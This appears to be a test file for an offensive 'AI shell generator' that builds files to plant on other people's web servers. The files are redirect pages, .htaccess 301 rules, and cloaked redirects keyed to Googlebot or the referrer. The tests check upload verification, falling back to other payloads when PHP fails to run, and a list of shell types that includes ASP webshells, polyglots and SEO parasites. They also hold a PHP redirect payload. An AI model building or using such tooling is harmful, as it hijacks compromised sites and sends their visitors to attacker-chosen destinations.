/**
 * Tests for PHP Execution Detection + Auto-Fallback to HTML/htaccess
 *
 * Covers:
 * 1. PHP execution detection (phpNotExecuting flag)
 * 2. Unconditional HTML redirect shell generation
 * 3. Unconditional .htaccess redirect shell generation
 * 4. Shell priority skipping when PHP fails
 * 5. verifyUploadedFile returns phpNotExecuting flag
 */
import { describe, it, expect } from "vitest";
import {
  generateUnconditionalHtmlRedirect,
  generateUnconditionalHtaccessRedirect,
  generateMetaRedirectHtml,
  generateJsRedirect,
  type GeneratedShell,
} from "./ai-shell-generator";

describe("Unconditional HTML Redirect Shell", () => {
  it("should generate HTML with meta refresh + JS redirect (no conditions)", () => {
    const shell = generateUnconditionalHtmlRedirect("https://target.com", ["seo keyword", "test"]);

    expect(shell.type).toBe("redirect_html");
    expect(shell.filename).toMatch(/\.html$/);
    expect(shell.contentType).toBe("text/html");
    expect(shell.id).toMatch(/^unconditional_html_/);

    const content = shell.content as string;
    // Must have meta refresh
    expect(content).toContain('http-equiv="refresh"');
    expect(content).toContain("url=https://target.com");
    // Must have JS redirect
    expect(content).toContain("window.location.replace");
    expect(content).toContain("https://target.com");
    // Must NOT have any conditional checks (no referer, no r=1, no googlebot)
    expect(content).not.toContain("referrer");
    expect(content).not.toContain("HTTP_REFERER");
    expect(content).not.toContain("googlebot");
    expect(content).not.toContain("r=1");
    // Must have SEO content
    expect(content).toContain("seo keyword");
    expect(content).toContain("test");
  });

  it("should have unconditional bypass techniques", () => {
    const shell = generateUnconditionalHtmlRedirect("https://example.com", ["test"]);
    expect(shell.bypassTechniques).toContain("unconditional");
    expect(shell.bypassTechniques).toContain("meta_refresh");
    expect(shell.bypassTechniques).toContain("js_redirect");
  });

  it("should handle empty keywords gracefully", () => {
    const shell = generateUnconditionalHtmlRedirect("https://example.com", []);
    const content = shell.content as string;
    expect(content).toContain("Redirecting");
    expect(content).toContain("https://example.com");
  });
});

describe("Unconditional .htaccess Redirect Shell", () => {
  it("should generate simple 301 redirect (no conditions)", () => {
    const shell = generateUnconditionalHtaccessRedirect("https://target.com");

    expect(shell.type).toBe("redirect_htaccess");
    expect(shell.filename).toBe(".htaccess");
    expect(shell.contentType).toBe("text/plain");
    expect(shell.id).toMatch(/^unconditional_htaccess_/);

    const content = shell.content as string;
    // Must have simple Redirect 301
    expect(content).toContain("Redirect 301 / https://target.com");
    // Must NOT have RewriteCond (no conditional logic)
    expect(content).not.toContain("RewriteCond");
    expect(content).not.toContain("HTTP_REFERER");
    expect(content).not.toContain("googlebot");
    expect(content).not.toContain("HTTP_USER_AGENT");
  });

  it("should have unconditional bypass techniques", () => {
    const shell = generateUnconditionalHtaccessRedirect("https://example.com");
    expect(shell.bypassTechniques).toContain("unconditional");
    expect(shell.bypassTechniques).toContain("301_redirect");
  });
});

describe("Conditional vs Unconditional Redirect Comparison", () => {
  it("conditional JS redirect should have referer checks", () => {
    const shell = generateJsRedirect("https://target.com", ["keyword"]);
    const content = shell.content as string;
    // JS redirect has conditional logic
    expect(content).toContain("referrer");
    expect(content).toContain("google");
    expect(content).toContain("r=1");
  });

  it("conditional meta redirect should NOT have referer checks (always redirects)", () => {
    const shell = generateMetaRedirectHtml("https://target.com", ["keyword"]);
    const content = shell.content as string;
    // Meta redirect is already unconditional
    expect(content).toContain('http-equiv="refresh"');
    expect(content).toContain("url=https://target.com");
    // No conditional logic in meta refresh
    expect(content).not.toContain("referrer");
    expect(content).not.toContain("$_SERVER");
  });

  it("unconditional HTML should combine meta + JS without conditions", () => {
    const unconditional = generateUnconditionalHtmlRedirect("https://target.com", ["keyword"]);
    const content = unconditional.content as string;
    // Has both meta and JS
    expect(content).toContain('http-equiv="refresh"');
    expect(content).toContain("window.location.replace");
    // No conditions
    expect(content).not.toContain("referrer");
    expect(content).not.toContain("googlebot");
  });
});

describe("PHP Execution Detection in verifyUploadedFile", () => {
  it("should return phpNotExecuting in verification result type", () => {
    // Type check: verifyUploadedFile return type includes phpNotExecuting
    type VerifyResult = {
      verified: boolean;
      redirectWorks: boolean;
      httpStatus: number;
      phpNotExecuting?: boolean;
    };

    const result: VerifyResult = {
      verified: true,
      redirectWorks: false,
      httpStatus: 200,
      phpNotExecuting: true,
    };

    expect(result.phpNotExecuting).toBe(true);
    expect(result.verified).toBe(true);
    expect(result.redirectWorks).toBe(false);
  });

  it("should detect raw PHP source code patterns", () => {
    // Simulate what the detection logic checks
    const phpSourcePatterns = ["<?php", "@ini_set", "$_SERVER", 'header("'];
    const phpBody = '<?php @ini_set("display_errors",0); $r="https://target.com"; header("Location: $r"); ?>';

    const phpNotExecuting = phpSourcePatterns.some((pattern) => phpBody.includes(pattern));
    expect(phpNotExecuting).toBe(true);
  });

  it("should NOT flag properly executing PHP (no raw source visible)", () => {
    const phpSourcePatterns = ["<?php", "@ini_set", "$_SERVER", 'header("'];
    // When PHP executes, the response is HTML output, not raw PHP
    const executedBody = "<!DOCTYPE html><html><head><title>Welcome</title></head><body><h1>Welcome</h1></body></html>";

    const phpNotExecuting = phpSourcePatterns.some((pattern) => executedBody.includes(pattern));
    expect(phpNotExecuting).toBe(false);
  });
});

describe("Shell Skipping Logic", () => {
  it("should identify PHP-dependent shell types for skipping", () => {
    const phpDependentTypes = ["redirect_php", "steganography", "polyglot"];
    const nonPhpTypes = ["redirect_html", "redirect_js", "redirect_htaccess", "webshell_asp", "seo_parasite"];

    // PHP shells should be skipped when phpExecutionFailed
    for (const t of phpDependentTypes) {
      expect(
        t === "redirect_php" || t === "steganography" || t === "polyglot",
      ).toBe(true);
    }

    // Non-PHP shells should NOT be skipped
    for (const t of nonPhpTypes) {
      expect(
        t === "redirect_php" || t === "steganography" || t === "polyglot",
      ).toBe(false);
    }
  });

  it("should generate unique filenames for fallback shells", () => {
    const shell1 = generateUnconditionalHtmlRedirect("https://a.com", ["test"]);
    const shell2 = generateUnconditionalHtmlRedirect("https://a.com", ["test"]);
    // Filenames should be different (random)
    expect(shell1.filename).not.toBe(shell2.filename);
    expect(shell1.id).not.toBe(shell2.id);
  });
});
